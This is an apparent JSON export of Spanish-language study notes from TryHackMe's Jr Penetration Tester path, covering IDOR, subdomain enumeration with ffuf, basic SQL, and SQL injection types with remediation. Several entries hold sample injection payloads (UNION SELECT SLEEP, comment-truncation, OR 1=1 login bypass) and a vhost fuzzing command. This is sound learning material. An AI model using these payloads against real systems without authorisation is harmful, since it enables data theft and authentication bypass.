    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/5. IDOR/5. Finding IDORs in Unpredictable IDs.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 5. IDOR",
    "content": "<h2>IDs Impredecibles</h2>\nSi no se pueden detectar usando los m√©todos anteriores, un m√©todo excelente de detecci√≥n de IDORs es crear dos cuentas y cambiar los n√∫meros de ID entre ellas. Si puedes ver el contenido del otro usuario cambiando el ID, encontraste una vulnerabilidad IDOR.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. IDOR",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/5-idor/0-idor/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/5. IDOR/0. IDOR.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 5. IDOR",
    "content": "[[1. What is IDOR]]\n[[2. An IDOR Exaxmple]]\n[[3. Finding IDORs in Encoded IDs]]\n[[4. Finding IDORs in Hashed IDs]]\n[[5. Finding IDORs in Unpredictable IDs]]\n[[6. Where are IDORs Located]]\n[[7. A practical IDOR Example]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Finding IDORs in Encoded IDs",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/5-idor/3-finding-idors-in-encoded-ids/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/5. IDOR/3. Finding IDORs in Encoded IDs.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 5. IDOR",
    "content": "<h2>Encoded IDs</h2>\nAl pasar informaci√≥n de p√°gina a p√°gina ya sea por POST, strings query, o cookies, los desarrolladores web normalmente primero tomar√°n la informaci√≥n raw y la encodear√°n. El encoding asegura que el servidor web recibidor ser√° capaz de entender los contenidos. El encoding cambiar informaci√≥n binaria a ASCII usando caracteres `a-z, A-Z, 0-9 y =`. La t√©cnica m√°s com√∫n de encoding es base64. Puedes usar webs como [esta](https://www.base64decode.org/) o la consola con el comando `base64`.\n\n![[Pasted image 20251104130145.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Where are IDORs Located",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/5-idor/6-where-are-idors-located/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/5. IDOR/6. Where are IDORs Located.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 5. IDOR",
    "content": "<h2>¬øD√≥nde se encuentran los IDORs?</h2>\nEl endpoint vulnerable que est√°s atacando puede no siempre ser algo que ves en la barra de b√∫squeda. Podr√≠a ser contenido que tu navegador carga v√≠a petici√≥n AJAX o algo referenciado en el archivo JavaScript.\n\nA veces, los endpoints podr√≠an tener un par√°metro no referenciado que podr√≠a haber sido usado durante el desarrollo y se pushe√≥ a producci√≥n. Por ejemplo, si llamas a `/user/details`, se muestra tu informaci√≥n por que tienes la sesi√≥n iniciada, pero mediante miner√≠a de par√°metros, podr√≠as descubrir un **user_id** que puedes usar para ver informaci√≥n de otros usuarios: `/user/details?user_id=123`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. What is IDOR",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/5-idor/1-what-is-idor/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/5. IDOR/1. What is IDOR.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 5. IDOR",
    "content": "En esta unidad vamos a aprender lo que es la vulnerabilidad IDOR, c√≥mo se ve, c√≥mo encontrarla y c√≥mo explotarla en un caso pr√°ctico.\n\n-----------------------------\n<h2>¬øQu√© es IDOR?</h2>\nIDOR significa Insecure Direct Object Reference y es un tipo de vulnerabilidad de control de acceso.\n\nEste tipo de vulnerabilidad puede ocurrir cuando un servidor web recibe input del usuario para recuperar objetos (archivos, informaci√≥n, documentos), demasiada confianzzaz ha sido depositada en la informaci√≥n de entrada, y no es validado en el lado del servidor para confirmar que el objeto requerido pertenece al usuario que lo ha pedido.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Virtual Hosts",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/3-subdomain-enumeration/6-virtual-hosts/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/3. Subdomain Enumeration/6. Virtual Hosts.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 3. Subdomain Enumeration",
    "content": "Algunos subdominios no siempre se hostean en DNSs p√∫blicos. En su lugar, el registro DNS podr√≠a guardarlo en un servidor DNS privado en la m√°quina del desarrollador.\n\nGracias a que los servidores web pueden hostear diferentes p√°ginas web en un servidor, cuando una web se pide desde un cliente, el servidor sabe qu√© p√°gina mostrar gracias al header del host. Podemos utilizar ese header para hacerle cambios. \n\nAl igual que coon la fuerza bruta de DNS, podemos automatizar este proceso.\n\n```bash\nuser@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H \"Host: FUZZ.acmeitsupport.thm\" -u http://MACHINE_IP\n```\n\nComo el comando de arriba siempre devolver√° un valor, podemos usar el argumento `-fs` para filtrar por tama√±o.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Subdomain Enumeration",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/3-subdomain-enumeration/0-subdomain-enumeration/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/3. Subdomain Enumeration/0. Subdomain Enumeration.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 3. Subdomain Enumeration",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/3. Subdomain Enumeration/1. Brief]]\n[[2. OSINT - SSL-TLS Certificates]]\n[[3. OSINT - Search Engines]]\n[[4. DNS Brute Force]]\n[[5. OSINT - Sublist3r]]\n[[6. Virtual Hosts]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. OSINT - Search Engines",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/3-subdomain-enumeration/3-osint-search-engines/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/3. Subdomain Enumeration/3. OSINT - Search Engines.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 3. Subdomain Enumeration",
    "content": "Los motores de b√∫squeda contienen millones de links a m√°s de un bill√≥n de p√°ginas web, lo que puede ser una fuente excelente para encontrar subdominios. Usando m√©todos de b√∫squeda avanzados en sitios como Google, como el filtro `site:`, puede estrechar mucho los resultados. Por ejemplo `site:*.domain.com -site:www.domain.com` s√≥lo mostrar√≠a resultados que llevan a `domain.com`, pero al excluir `www.domain.com` nos quedamos con los subdominios.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. DNS Brute Force",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/3-subdomain-enumeration/4-dns-brute-force/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/3. Subdomain Enumeration/4. DNS Brute Force.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 3. Subdomain Enumeration",
    "content": "La enumeraci√≥n de fuerza bruta de DNS (Domain Name System) es un  m√©todo en el que se prueban cientos miles o millones de posibles subdominios de una lista predeterminada de subdominios com√∫nmente usados. Lo automatizamos con herramientas ya qu erequiere much√≠simas peticiones.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. OSINT - Sublist3r",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/3-subdomain-enumeration/5-osint-sublist3r/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/3. Subdomain Enumeration/5. OSINT - Sublist3r.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 3. Subdomain Enumeration",
    "content": "Para acelerar el proceso del descubrimiento de subdominios OSINT, podemos automatizar los m√©todos de arriba con la ayuda de herramientas como [Sublist3r](https://www.kali.org/tools/sublist3r/).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. OSINT - SSL-TLS Certificates",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/3-subdomain-enumeration/2-osint-ssl-tls-certificates/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/3. Subdomain Enumeration/2. OSINT - SSL-TLS Certificates.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 3. Subdomain Enumeration",
    "content": "Cuando se crea un certificado SSL/TLS (Secure Sockets Layer/Transport Layer Security) para un dominio por una CA (Certificate Authority), esta CA pparticipa en lo que se conoce como \"logs de Certificado de Transpariencia (CT)\". Estos son logs p√∫blicos y accesibles creados para un nombre de dominio. El prop√≥sito de los logs CT es evitar que certificados maliciosos o hechos accidentalmente sean usados. Podemos usar este servicio para nuestra ventaja para descubrir subdominios de una web, para ver una base de datos de certificados pincha [aqu√≠](https://crt.sh/) o busca en internet.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Brief",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/3-subdomain-enumeration/1-brief/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/3. Subdomain Enumeration/1. Brief.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 3. Subdomain Enumeration",
    "content": "La enumeraci√≥n de subdominios es el proceso de encontrar subdominios v√°lidos para un dominio. Pero ¬øpor qu√© hacemos esto? Para expandir la superficie de ataque y tratar de descubrir m√°s puntos potenciales de vulnerabilidad.\n\nExploraremos tres m√©todos de enumeraci√≥n de subdominios diferentes: Fuerza Bruta, OSINT y Virtual Host.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. What is SQL",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/11-sql-injection/3-what-is-sql/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/11. SQL Injection/3. What is SQL.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 11. SQL Injection",
    "content": "SQL es un lenguaje rico en funcionalidades usado para realizar queries a las bases de datos. Estas queries se conocen como statements.\n\nEl comando m√°s simple que cubriremos en esta tarea ser√° **SELECT** (para que nos devuelva algo que le pidamos), **UPDATE** (para actualizar la informaci√≥n guardada en una tabla), **INSERT** (para meter informaci√≥n en una tabla) y **DELETE** (para borrar informaci√≥n de una tabla).\n\n>[!CAUTION] SQL no es case-sentitive (no distigue entre may√∫sculas y min√∫sculas).\n\n-----------------------------------------\n<h2>SELECT</h2>\nEl primer tipo de query que aprenderemos sera SELECT. Usado para recuperar informaci√≥n de una base de datos.\n\n`SELECT * FROM users;`\n\n| **id** | **username** | **password** |\n| ------ | ------------ | ------------ |\n| 1      | jon          | pass123      |\n| 2      | admin        | p4ssword     |\n| 3      | martin       | secret123    |\nEl statement SELECT le dice a la base de datos que seleccione datos. El `*` le dice que queremos seleccionar todos. El `FROM` le dice de d√≥nde queremos rescatar los datos. Por √∫ltimo indicamos la tabla, en este caso `users`.\n\nLa siguiente se parece a la de arriba pero en este caso en lugar de usar `*` le pedimos una (o m√°s) en espec√≠fico.\n\n`SELECT username,password FROM users;`\n\n| **username** | **password** |\n| ------------ | ------------ |\n| jon          | pass123      |\n| admin        | p4ssword     |\n| martin       | secret123    |\n\nLa siguiente query, al igual que la primera, devuelve todas las columnas usando el selector `*`. La cl√°usula `LIMIT 1` fuerza a la base de datos a s√≥lo devolver una fila de informaci√≥n. Cambiar la query a `LIMIT1,1` fuerza a la base de datos a saltarse el primer resultado y luego, la query `LIMIT 2,1` fuerza a la base de datos a saltarse los dos primeros resultados. Recuerda, el primer n√∫mero le dice a la base de datos cu√°ntas lineas saltar y el segundo cu√°ntas devolver.\n\n`SELECT * FROM users LIMIT 1;`\n\n| **id** | **username** | **password** |\n| ------ | ------------ | ------------ |\n| 1      | jon          | pass123      |\n\nFinalmente vamos a utilizar la cl√°usula `WHERE`. As√≠ es como podemos escoger exactamente la informaci√≥n que queremos extraer.\n\n`SELECT * FROM users WHERE username='admin';`\n\n| **id** | **username** | **password** |\n| ------ | ------------ | ------------ |\n| 2      | admin        | p4ssword     |\nEsto s√≥lo devolver√° filas donde el username sea \"admin\".\n\nSi queremos que se devuelvan las columnas donde el username **NO** es admin:\n\n`SELECT * FROM users WHERE username != 'admin';`\n\n| **id** | **username** | **password** |\n| ------ | ------------ | ------------ |\n| 1      | jon          | pass123      |\n| 3      | martin       | secret123    |\nSi queremos seleccionar varias condiciones:\n\n`SELECT * FROM users WHERE username='admin' OR username='jon';`\n\n| **id** | **username** | **password** |\n| ------ | ------------ | ------------ |\n| 1      | jon          | pass123      |\n| 2      | admin        | p4ssword     |\nTambi√©n se pueden juntar varias columnas:\n\n`SELECT * FROM users WHERE username='admin' AND password='p4ssword';`\n\n| **id** | **username** | **password** |\n| ------ | ------------ | ------------ |\n| 2      | admin        | p4ssword     |\n\nUsar la cl√°usula `LIKE` te permite especificar informaci√≥n que no coincida exactamente pero que comience, termine o contenga ciertos caracteres.\n\n`SELECT * FROM users WHERE username LIKE 'a%';`\n\n| **id** | **username** | **password** |\n| ------ | ------------ | ------------ |\n| 2      | admin        | p4ssword     |\nEste devuelve aquellos usuarios cuyo nombre comience por \"a\". Mientras es la siguiente sentencia devuelve aquellos que acaban con \"n\":\n\n`SELECT * FROM users WHERE username LIKE '%n';`\n\n| **id** | **username** | **password** |\n| ------ | ------------ | ------------ |\n| 1      | jon          | pass123      |\n| 2      | admin        | p4ssword     |\n| 3      | martin       | secret123    |\nEsta otra hace que devuelva aquellos usuarios que contengan \"mi\" en su nombre:\n\n`SELECT * FROM users WHERE username LIKE '%mi%';`\n\n| **id** | **username** | **password** |\n| ------ | ------------ | ------------ |\n| 2      | admin        | p4ssword     |\n\n<h5>UNION</h5>\nEl statement UNION combina los resultados de dos o m√°s queries SELECT para recuperar informaci√≥n de una s√≥la o m√∫ltiples tablas. La regla para este statement es que debe recuperar el mismo n√∫mero de columnas en cada statement SELECT, las columnas deben tener un tipo de dato similar y el orden de la columna tiene que ser el mismo. Puede sonar lioso, veamos la siguiente analog√≠a.\n\nImagina que una compa√±√≠a quiere crear una lista de direcciones de todos los clientes y distribuidores para mandar un nuevo cat√°logo. Tenemos una tabla llamada \"**customers**\" con los siguientes contenidos:\n\n| **id** | **name**         | **address**     | **city**   | **postcode** |\n| ------ | ---------------- | --------------- | ---------- | ------------ |\n| 1      | Mr John Smith    | 123 Fake Street | Manchester | M2 3FJ       |\n| 2      | Mrs Jenny Palmer | 99 Green Road   | Birmingham | B2 4KL       |\n| 3      | Miss Sarah Lewis | 15 Fore Street  | London     | NW12 3GH     |\nY otra llamada \"**suppliers**\" con los siguientes contenidos:\n\n| **id** | **company**      | **address**                 | **city** | **postcode** |\n| ------ | ---------------- | --------------------------- | -------- | ------------ |\n| 1      | Widgets Ltd      | Unit 1a, Newby Estate       | Bristol  | BS19 4RT     |\n| 2      | The Tool Company | 75 Industrial Road          | Norwich  | N22 3DR      |\n| 3      | Axe Makers Ltd   | 2b Makers Unit, Market Road | London   | SE9 1KK      |\nUsando el siguiente statement, podemos recoger resultados de las dos tablas y ponerlos en una sola:\n\n`SELECT name,address,city,postcode FROM customers UNION SELECT company,address,city,postcode FROM suppliers;`\n\n| **name**         | **address**                 | **city**   | **postcode** |\n| ---------------- | --------------------------- | ---------- | ------------ |\n| Mr John Smith    | 123 Fake Street             | Manchester | M2 3FJ       |\n| Mrs Jenny Palmer | 99 Green Road               | Birmingham | B2 4KL       |\n| Miss Sarah Lewis | 15 Fore Street              | London     | NW12 3GH     |\n| Widgets Ltd      | Unit 1a, Newby Estate       | Bristol    | BS19 4RT     |\n| The Tool Company | 75 Industrial Road          | Norwich    | N22 3DR      |\n| Axe Makers Ltd   | 2b Makers Unit, Market Road | London     | SE9 1KK      |\n\n----------------------------\n<h2>INSERT</h2>\nEl statement INSERT le dice a la base de datos que vamos a introducir informaci√≥n. La cl√°usula INTO le dice en qu√© tabla la vamos a introducir. Despu√©s se mete el nombre de las columnas entre par√©ntesis y la cl√°usula VALUES indica lo que introduciremos seguido de los valores entre par√©ntesis.\n\n`INSERT INTO users (username, password) VALUES ('bob', 'password123');`\n\n| **id** | **username** | **password** |\n| ------ | ------------ | ------------ |\n| 1      | jon          | pass123      |\n| 2      | admin        | p4ssword     |\n| 3      | martin       | secret123    |\n| 4      | bob          | password123  |\n\n>[!IMPORTANT] No hace falta introducir id en la columna porque es `AUTO_INCREMENT`, pero si estuviera definido como `NOT NULL` en la descripci√≥n de la tabla habr√≠a que introducirlo aunque no quisi√©ramos.\n\n-------------------------------------\n<h2>UPDATE</h2>\nEl statement UPDATE le dice a la base de datos que queremos actualizar una o m√°s filas de informaci√≥n en una tabla. Primero se especifica la tabla, luego con SET especificamos los campos que cambiaremos y su nuevo valor y con la cl√°usula WHERE indicamos en qu√© fila lo cambiaremos.\n\n`UPDATE users SET username='root',password='pass123' WHERE username='admin';`\n\n| **id** | **username** | **password** |\n| ------ | ------------ | ------------ |\n| 1      | jon          | pass123      |\n| 2      | root         | pass123      |\n| 3      | martin       | secret123    |\n| 4      | bob          | password123  |\n\n---------------------------------\n<h2>DELETE</h2>\nEl statement DELETE le dice a la base de datos que queremos borrar una o m√°s filas de datos. Este tipo de query es muy similar a la de SELECT. Puedes especificar qu√© fila borrar haciendo uso de WHERE y limitar el n√∫mero de filas borrado con LIMIT.\n\n`DELETE FROM users WHERE username='martin';`\n\n| **id** | **username** | **password** |\n| ------ | ------------ | ------------ |\n| 1      | jon          | pass123      |\n| 2      | root         | pass123      |\n| 4      | bob          | password123  |\nSi no especificas con la cl√°usula WHERE borrar√°s toda la tabla de datos.\n\n`DELETE FROM users;`\n\n| **id** | **username** | **password** |\n| ------ | ------------ | ------------ |\n\n>[!IMPORTANT] RECUERDA: [NO OLVIDES EL WHERE EN EL DELETE FROM](https://www.youtube.com/watch?v=i_cVJgIz_Cs), porfa :)",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "9. Out-of-Band SQLI",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/11-sql-injection/9-out-of-band-sqli/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/11. SQL Injection/9. Out-of-Band SQLI.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 11. SQL Injection",
    "content": "La SQLi Out-of-Band no es tan com√∫n ya que depende o en funcionalidades espec√≠ficas siendo habilitadas en el servidor o en la l√≥gica de negocio de la aplicaci√≥n.\n\nUn ataque Out-of-Band se clasifica como tener dos canales de comunicaci√≥n diferentes, uno para lanzar el ataque y otro para recoger la informaci√≥n. Por ejemplo, el canal de ataque podr√≠a ser una petici√≥n web y el otro canal monitorizar peticiones HTTP/DNS hechas a un servidor que tu controles.\n\n1. Un atacante hace una petici√≥n a un sitio web vulnerable a SQLi Out-of-Band.\n2. El sitio web hace una query SQL a la base de datos pasando el payload del atacante.\n3. El payload contiene una petici√≥n HTTP forzada a una m√°quina del atacante conteniendo datos de la base de datos.\n\n![[Pasted image 20251114130345.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "10. Remediation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/11-sql-injection/10-remediation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/11. SQL Injection/10. Remediation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 11. SQL Injection",
    "content": "Los desarrolladores tienen maneras de proteger sus aplicaciones web de ser vulnerables a SQLi siguiendo los siguientes consejos.\n\n----------------------\n<h2>Prepared Statements</h2>\nEn una query preparada, lo primero que escribe un desarrollador es la query, luego el input del usuario se a√±ade. Escribir statements preparados asegura que el c√≥digo no cambie la estructura o informaci√≥n de la base de datos.\n\n----------------------------\n<h2>Input Validation</h2>\nEmplear una lista de strings permitidas o un sistema de reemplazo de strings es un buen sistema para validar el input.\n\n--------------------------------\n<h2>Escaping User Input</h2>\nEscapar el input del usuario es un m√©todo mediante el cual evitamos que el usuario pueda introducir ciertos caracteres como `'`, `\"`, etc. Como ya hemos visto, estos pueden llevar a un ataque y exfiltraci√≥n masiva de datos.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Brief",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/11-sql-injection/1-brief/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/11. SQL Injection/1. Brief.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 11. SQL Injection",
    "content": "SQL Injection, m√°s conocida como SQLi, es un ataque en el servidor de base de datos de una aplicaci√≥n web que causa que se ejecuten queries maliciosas. Cuando una aplicaci√≥n web se comunica con una base de datos usando un input del usuario que no ha sido correctamente sanitizado, ah√≠ yace el potencial del atacante para robar, borrar o alterar informaci√≥n privada y de clientes. Por esto la SQLi es una de las vulnerabilidades m√°s viejas que existen (y tambi√©n podr√≠a ser una de las m√°s da√±inas).\n\nEn esta unidad aprenderemos lo que son las bases de datos, qu√© es SQL con algunos comandos SQL b√°sicos, c√≥mo detectar vulnerabilidades SQL, c√≥mo explotarlas y, como desarrollador, c√≥mo protegernos de estas.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Blind SQLI - Time Based",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/11-sql-injection/8-blind-sqli-time-based/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/11. SQL Injection/8. Blind SQLI - Time Based.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 11. SQL Injection",
    "content": "Una SQLi basada en tiempo es muy similar a la de arriba ya que se mandan las mismas peticiones solo que no hay indicador visual que indique si estamos o no en lo correcto, por lo que tenemos que basarnos en el tiempo que tarda en llegar la respuesta. Este retraso en la respuesta la introducimos con el comando SLEEP(), que s√≥lo se ejecutar√° con un statement exitoso de UNION SELECT.\n\nPara investigar el n√∫mero de columnas de una tabla usar√≠amos por ejemplo: \n\n`admin123' UNION SELECT SLEEP(5);-- -`\n\nSi no hay pausa en la respuesta sabemos que no es esa, por lo que a√±adimos otra columna:\n\n`admin123' UNION SELECT SLEEP(5),2;-- -`\n\nSi se produce una espera confirmamos que estamos en lo cierto. Ahora podemos repetir el proceso de la SQLi basada en booleanos a√±adiendo el m√©todo SLEEP().\n\n---------------------------\n<h2>Pr√°ctica</h2>\nVamos a ver un ejemplo pr√°ctico.\n\n-----------------------\n<h2>Nivel 4</h2>\nLlegamos a lo siguiente.\n![[Pasted image 20251114124556.png]]\n\nSi vamos probando todos los caracteres llegamos a:\n\n![[Pasted image 20251114124938.png]]\n\nObtenemos uno de los nombres de columna y hacemos lo mismo para 'password':\n\n![[Pasted image 20251114125126.png]]\n\nObtenemos el nombre de un usuario 'admin':\n\n![[Pasted image 20251114125306.png]]\n\nVamos a por la contrase√±a:\n\n![[Pasted image 20251114125613.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. What is SQL Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/11-sql-injection/4-what-is-sql-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/11. SQL Injection/4. What is SQL Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 11. SQL Injection",
    "content": "<h2>¬øQu√© es SQL Injection?</h2>\nEl punto donde una aplicaci√≥n web que usa SQL se puede transformar en SQL Injection es cuando se incluye en una query SQL informaci√≥n proporcionada por el usuario.\n\n----------------------------------\n<h2>¬øC√≥mo se ve?</h2>\nToma el siguiente escenario. Te cruzas con un blog online y cada entrada del bloque tiene un ID √∫nico. Las entradas del blog pueden ser p√∫blicas o privadas, dependiendo de si est√°n listas para que el p√∫blico las vea. La URL de cada entrada de blog pude verse algo como:\n\n`https://website.thm/blog?id=1`\n\nDe la URL de arriba, podemos ver que hay un par√°metro id. La aplicaci√≥n web necesita recuperar el art√≠culo de una base de datos y puede que use un statement SQL de parezca lo siguiente:\n\n`SELECT * FROM blog WHERE id=1 AND private=0 LIMIT 1;`\n\nDe lo que has aprendido deber√≠as saber que la query de arriba busca un art√≠culo en la tabla `blog` con el `id=1` y la columna `private=0`, que significa que puede ser vista por el p√∫blico (0:false;1:true).\n\nImaginemos ahora que hay un art√≠culo con `id=2` que es privado pero nosotros introducimos lo siguiente:\n\n`http://website.thm/blog?id=2;-- -`\n\nEsto se transformar√≠a en la query:\n\n`SELECT * FROM blog WHERE id=2;-- - AND private=0 LIMIT 1;`\n\nEl punto y coma (`;`) hace que termine el statement actual y el `-- -` hace que lo que viene despu√©s sea un comentario, por lo que la query de arriba en realidad es:\n\n`SELECT * FROM blog WHERE id=2;`\n\nEsto devolver√° el art√≠culo con `id=2` sin importar si este es p√∫blico o no.\n\nEsto fue un ejemplo de una vulnerabilidad SQLi conocida como In-Band SQL Injection. Hay tres tipos: In-Band, Blind y Out-of-Band, que veremos en adelante.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Blind SQLI - Authentication Bypass",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/11-sql-injection/6-blind-sqli-authentication-bypass/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/11. SQL Injection/6. Blind SQLI - Authentication Bypass.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 11. SQL Injection",
    "content": "Al contrario que la SQLi In-Band, donde podemos ver los resultados de nuestro ataque en la pantalla, las vulnerabilidades SQLi Blind son aquellas en las que tenemos muy poco o nada de feedback para confirmar si las queries inyectadas fueron o no exitosas.\n\n-------------------------------------\n<h2>Bypasseo de Autentificaci√≥n</h2>\nUna de las t√©cnicas m√°s directas de SQLi Blind es al bypassear los m√©todos de autentificaci√≥n como los formularios de log in. Aqu√≠ no nos interesa recuperar informaci√≥n, sino simplemente sobrepasar el formulario.\n\nEstos formularios est√°n conectados a la base de datos y normalmente por la forma de desarrollo no le interesa cu√°les son los usuario y contrase√±a introducidos sino m√°s bien si ese par existe a la vez en la base de datos.\n\n----------------------\n<h2>Pr√°ctica</h2>\nVamos a ver algunos ejemplos pr√°cticos.\n\n--------------------------------------\n<h2>Nivel 2</h2>\n1. Hacemos pruebas para ver si hay par√°metros.\n   ![[Pasted image 20251114103243.png]]\n2. Vemos que no los hay, por lo que trabajaremos con los campos de input. Tambi√©n podr√≠amos haber mandado una query como: `SELECT * FROM users WHERE username='' AND password='' OR 1=1;`\n   ![[Pasted image 20251114103357.png]]\n\n>[!CAUTION] Si \"admin\" no existiera, no nos hubiera valido la primera query.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. What is a Database",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/11-sql-injection/2-what-is-a-database/",
